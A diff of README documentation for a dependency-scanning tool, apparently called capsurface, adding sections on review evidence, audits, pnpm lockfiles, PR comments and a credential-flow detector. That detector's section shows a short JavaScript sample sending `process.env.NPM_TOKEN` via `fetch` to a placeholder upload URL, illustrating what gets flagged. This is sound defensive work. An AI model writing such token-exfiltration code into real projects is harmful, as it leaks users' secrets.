@@ -17,13 +17,98 @@ writes either format to a file. Entries include the predecessor selection,
 capability changes, new risk flags, source evidence and scan coverage.
 Nonblocking changes such as a new `NO_COLOR` read remain visible.
 
+Source evidence is shown for both versions. JSON retains current evidence in
+`evidence` and adds `baselineEvidence`, grouped by predecessor version and
+installation. Ambiguous predecessors remain separate candidates, not a merged
+history. Baseline coverage gaps and differing scanning rules are identified.
+Missing evidence means the scanner did not record an indicator; it does not
+prove an operation was absent. For example, replacing `graceful-fs` with `fs`
+can expose an operation the previous scan did not recognize.
+
+This update changes the rules fingerprint because comparison wording is part
+of the fingerprinted engine. Rescan both snapshots with the same engine before
+approving an update; existing baseline rule-change warnings remain in effect.
+
 The exit codes follow `check`: 0 for a passing comparison, 1 for escalations
 or ambiguous predecessors, 2 for invalid inputs. Add `--fail-on-new` to
 block unapproved new packages. `--report-only` preserves the findings but
 returns 0 for a completed comparison; invalid snapshots still fail.
 The report file is written even when the comparison returns 1.
 
+## Inspect a saved review entry by ID
+
+Save a JSON review and use its exact entry ID to retrieve one installation's
+details. `explain` reads local data only; it neither scans nor approves anything.
+
+```bash
+capsurface review .capsurface/after --baseline .capsurface/before.lock.json --json --out review.json
+# review may exit 1 for findings; its JSON file is still written.
+capsurface explain --report review.json --id <review-id> --json
+capsurface explain --report review.json --id <review-id> --out explanation.json
+```
+
+Output is JSON by default; `--json` is optional. `entry` preserves the saved
+review entry, including changes, blocking reasons, evidence before/after,
+coverage, integrity, source context and available provenance. A matching
+installation audit is included as `audit` when uniquely available. Fields
+absent from an older report are not invented. npm chains require generating
+the original review with `--lockfile`; pnpm references come from its artifact.
+
+`source.freshness` is always `not-checked`. Paths recorded inside a report are
+descriptive and are never followed. The command can inspect old reports after
+their scan inputs have been removed. Report data is not authenticated or
+recomputed, and `entry.approvable` only describes the saved review. Use a fresh
+`review` and the normal `approve` workflow for an actual approval decision.
+
+`idKind: review-content-id` identifies the existing ID tied to comparison
+content, not a permanent issue ID across package upgrades. Full IDs are
+required; missing or duplicate matches are errors. Only review JSON schema 1
+is accepted, not `check --json`, SARIF or Markdown. Input is bounded to 64 MiB.
+
+Exit 0 means the lookup succeeded, even if `report.wouldFail` or
+`entry.blocking` is true. Invalid input exits 2 with no JSON on stdout. `--out`
+writes the result without a status message on stdout and cannot overwrite
+the source report. This command does not replace a CI gate.
+
+## Audit passing comparisons and approvals
+
+Every JSON review includes `audit.installations`, even when `entries` is empty.
+It covers the current scanned installations, not historical approvals for
+packages that are no longer installed. `audit.counts` assigns each installation
+to one state: `incomplete`, `unbaselined`, `review-required`, `approved`,
+`unchanged` or `informational`, in that order of precedence.
+
+`approved` means a selective approval from the selected baseline applies to
+this comparison, with matching content and no coverage, engine or escalation
+issue. `unchanged` means no review change was detected without a selective
+approval. Neither state certifies safety. `unbaselined` remains visible even
+when the default gate permits a new package; use `--fail-on-new` to block it.
+
+Each installation records coverage status, rule changes and the actual
+`blocking` decision independently. Approval statuses are `none`, `applied`,
+`expired`, `invalid`, `not-applicable` (for example, changed content),
+`needs-review` or `ambiguous`. Available reasons, timestamps, expiry and
+selected baseline version/path are retained. Ambiguous predecessors cannot
+lend approvals to one another. Approval data in the current scan is not used
+as the audit's source of authorization.
+
+The CLI joins reasons from the baseline's approval history only when one
+record matches the package, version, installation, content digest, rules,
+approval timestamp and expiration. Missing or conflicting history leaves
+the reason unavailable instead of attributing a different review's reason.
+Programmatic callers can pass this history as `buildReview`'s fifth argument.
+
+The Markdown audit shows totals and recorded approval details. SARIF retains
+the same audit in `runs[0].properties.audit`, including when `results` is
+empty. Consumers must read these properties to display the audit; a SARIF
+viewer may show only findings. The audit adds explanation without changing
+gate decisions or creating extra SARIF alerts. `review-required` can also
+identify stale scanning rules even where the existing gate does not block.
+
 ## Review published tarballs before installation
+
+For pnpm v9, see [pnpm lockfiles](#pnpm-v9-lockfiles) below. The following
+archive-map format and constraints apply to npm lockfiles.
 
 `scan-lock` reads an npm lockfile v2/v3 and a local archive map. It verifies each
 archive against the lockfile's strongest supported integrity digest, scans its
@@ -65,7 +150,10 @@ and rescan both sides from the same input kind. Integrity binds bytes to the
 provided lockfile; it is not a publisher signature or proof of benign content.
 
 The archive reader supports gzip-compressed USTAR, per-entry POSIX PAX metadata
-and GNU long names. Files must be below `package/`. It rejects traversal, links,
+and GNU long names, including node-tar atime/ctime header fields. Files must
+share one portable top-level directory, such as `package/` or `babel__core/`;
+that directory is stripped before scanning. Mixed roots are rejected, and the
+extracted package identity must still match the lockfile. It rejects traversal, links,
 special files, conflicting duplicates, nonportable paths and case/Unicode
 collisions. Benign `.` path segments and identical regular-file duplicates are
 normalized; differing duplicate contents fail. File modes/owners are not
@@ -83,6 +171,71 @@ Missing archives, integrity/identity mismatches or extraction failures leave the
 output inventory incomplete, so it cannot be reviewed or approved. Source-level
 coverage failures retain a valid inventory for diagnostics but exit 2 and block
 approval. Temporary extracted files are removed on completion or failure.
+
+### pnpm v9 lockfiles
+
+Files ending in `.yaml` or `.yml` use the pnpm v9 adapter. Install the optional
+YAML parser alongside the tool, never in the inspected project. In a reviewed
+capsurface checkout:
+
+```bash
+npm install --no-save --package-lock=false --ignore-scripts --include=peer yaml@2.9.1
+```
+
+For `--deep`, include `acorn@8.15.0 acorn-typescript@1.4.13` in the same install
+command. YAML parsing requires Node >=14.6, runs in a separate process with a
+five-second timeout and a 256 MiB V8 heap limit, and rejects duplicate keys,
+aliases, custom tags and multiple documents. The default npm workflow does
+not require YAML or access the network. See the [YAML parser documentation](https://eemeli.org/yaml/).
+
+The pnpm archive map uses exact **package IDs**, not guessed registry URLs or
+dependency aliases. Obtain the archives separately and map them as follows:
+
+```json
+{
+  "string_decoder@1.3.0": "archives/string_decoder-1.3.0.tgz",
+  "@types/babel__core@7.20.5": "archives/babel-core-types-7.20.5.tgz"
+}
+```
+
+Every registry package in the lockfile must have an archive, including dev,
+optional and platform-specific dependencies. Integrity and package name/version
+are verified against the lockfile before scanning. Registry URLs are retained
+only when explicitly present in `resolution.tarball`.
+
+```bash
+capsurface scan-lock before/pnpm-lock.yaml --tarballs archives.json --out .capsurface/pnpm-before
+capsurface baseline .capsurface/pnpm-before --out .capsurface/pnpm.lock.json
+capsurface scan-lock pnpm-lock.yaml --tarballs archives.json --out .capsurface/pnpm-after
+capsurface review .capsurface/pnpm-after --baseline .capsurface/pnpm.lock.json
+```
+
+Do not pass a pnpm file to `review --lockfile`; that optional dependency-chain
+resolver still accepts npm JSON only. pnpm metadata comes from the scan's
+`artifact`: `packageId`, exact `snapshotKey`, direct `importers` and `parents`.
+Each reference preserves its dependency alias and kind. These are direct edges,
+not computed root-to-package chains. Markdown shows direct workspace references;
+JSON and SARIF retain both edge lists.
+
+Peer contexts remain separate snapshots. Their synthetic `installPath` is
+`pnpm/` plus the SHA-256 of the snapshot key, not a physical node_modules path.
+Updates with multiple possible predecessors keep the existing conservative
+ambiguity behavior. These manifests use `scanOrigin: pnpm-tarball-v1` and must
+not share baselines with installed-tree or npm-lock tarball scans. Both sides
+must be rescanned after this engine update.
+
+Linked workspaces must resolve to an importer within the lockfile. The command
+scans their registry dependencies, **not project or workspace source files**.
+Git/local packages, patched packages, unsupported resolutions, dangling graph
+references and packages without snapshots fail explicitly. Configuration and
+package-manager dependencies in importers are not supported. Limits include
+10,000 packages, snapshots or importers, 100,000 dependency edges and the shared
+archive budgets above. Missing or unsupported input leaves an incomplete
+inventory rather than a passing partial scan.
+
+Named roots and node-tar timestamp fields are supported, including the archive
+layout in `@types/babel__core@7.20.5`. Other archive restrictions above remain
+in force; unsupported inputs cannot be skipped to produce a passing scan.
 
 ## Accept one installation
 
@@ -316,6 +469,15 @@ compiler transforms or dependency code execute.
 
 Each file has a 1 MiB source budget, 100,000-token/node/evaluation budgets and
 32 levels of static value resolution, in addition to the graph's existing limits.
+Parsing and AST analysis run in a separate Node process with a five-second
+wall-clock timeout per invocation (including startup), a 256 MiB V8 old-space
+limit and a 16 MiB output limit. Timeout kills and reaps the helper and records
+`ast-timeout`; crashes or invalid output record `ast-worker-error`. Both make
+coverage incomplete. The old-space limit is not a total process memory cap.
+This adds startup overhead per invocation; install-graph and package-wide
+analysis may inspect a file separately. There is no total package scan deadline.
+Inspected code is sent as data and never executed. This process boundary is a
+resource safeguard, not a sandbox for running untrusted code.
 
 Deep context has `installContext.schemaVersion: 2`, `analysis: ast-import-graph`
 and `ast` metadata with parser identities and processed/unavailable file counts.
@@ -588,3 +750,86 @@ When artifact upload is enabled, it retains `.capsurface-snapshot`; keep this hi
 copying or downloading scan inventories. SARIF and source evidence can
 contain dependency source snippets, so artifact access follows repository
 permissions.
+
+## Optional persistent pull request comment
+
+With a reviewed Action commit containing comment support, set `comment-pr: 'true'`
+and grant the job `pull-requests: write`. The default remains off. Use a stable,
+unique `comment-key` for each project or matrix job; keys accept letters,
+numbers, dots, underscores and hyphens (up to 80 characters).
+
+The Action creates a comment when there are findings or a failing/incomplete
+check, updates its own GitHub Actions bot comment when the displayed result
+changes, and updates it to show a passing result when the gate clears. An
+initial clean review with no entries creates no comment. Changing only a
+review ID does not cause an edit; use the full reports for approval IDs.
+The comment distinguishes the proposed-baseline gate from the review against
+the target baseline, so approving a proposed baseline does not erase the
+comparison with the target branch. Long reports are shortened; changes in
+omitted content still invalidate the comment fingerprint.
+
+Only same-repository `pull_request` events are supported. Fork PRs and other
+events retain the job summary without posting. Do not switch to
+`pull_request_target` to bypass token restrictions or run untrusted PR code
+with privileged credentials. The Action uses the job token only in the
+comment step. Missing permissions or API errors produce a warning and leave
+the independent capability gate unchanged.
+
+Configure workflow concurrency per PR and comment key to avoid overlapping
+writers, especially duplicate first comments. The example workflow includes
+a concurrency group. The publisher also verifies the live PR's head and base
+SHA before writing, but GitHub comment updates are not atomic with that check.
+Use the standard `github.token`; custom bot identities are not supported.
+Comments are optional and require a commit containing this feature: the
+example's existing release pin intentionally remains unchanged.
+
+
+## Credential flows to fetch
+
+Experimental `--deep` scans record local static value paths from credential-shaped
+`process.env` names to the global `fetch` function. For example:
+
+```js
+const token = process.env.NPM_TOKEN;
+const payload = token;
+fetch('https://example.test/upload', { body: payload });
+```
+
+The manifest's `credentialFlows` includes the source name, sink argument, and
+original file, line and snippet for the source, alias uses and sink. JSON review
+entries retain current paths and each baseline candidate's paths separately.
+Markdown shows current paths; SARIF retains them in result properties and text.
+No dependency code is executed.
+
+The analyzer follows immutable local `const` aliases, string concatenation and
+template interpolation within one function (or at module scope). It recognizes
+credential values in the URL, an inline options object's `body`, and inline
+`headers` values. Lexical shadowing, binding reassignment and supported TypeScript
+wrappers use the same rules as the import analyzer. Duplicate object keys follow
+last-property semantics; spreads, getters and unresolved keys prevent object
+attribution. The source name is a credential naming heuristic, not proof its value
+is a secret.
+
+A newly observed path requires review even if the package already had the same
+network and environment indicators. Comparison uses the file, credential name,
+sink API and argument, including occurrence counts. Formatting, line shifts and
+local alias renaming alone do not create new paths. Moving a path to another
+function in the same file with the same signature and count is not distinguished.
+A baseline without this field yields `credential-flow-unreviewed` when paths are
+found; rescan both versions with the same engine to compare them.
+
+This first version does not follow mutable variables, object aliases, destructured
+credential values, user function calls, cross-function or cross-file flows,
+credential files, imported HTTP clients, or encodings and other transformations.
+Control-flow feasibility and runtime mutation through unknown calls are not
+modeled. Files with recognized environment-property writes omit flow attribution
+and record `environment-mutation` in `credentialFlows.errors`. Source or parser
+failures and skipped files count toward `filesUnavailable`. Absence of paths is
+inconclusive. A recorded path does not prove execution, transmission or malicious
+intent; authentication code may legitimately produce findings.
+
+Flow tracing shares the isolated AST worker's five-second deadline. It also has
+limits of 10,000 tracing visits, depth 32, 100 findings per file and 200 per package.
+Exceeding those limits marks the scan incomplete and prevents approval. Basic
+scanning has no flow field and still requires no parser. These changes update the
+engine fingerprint, so existing baselines need review.
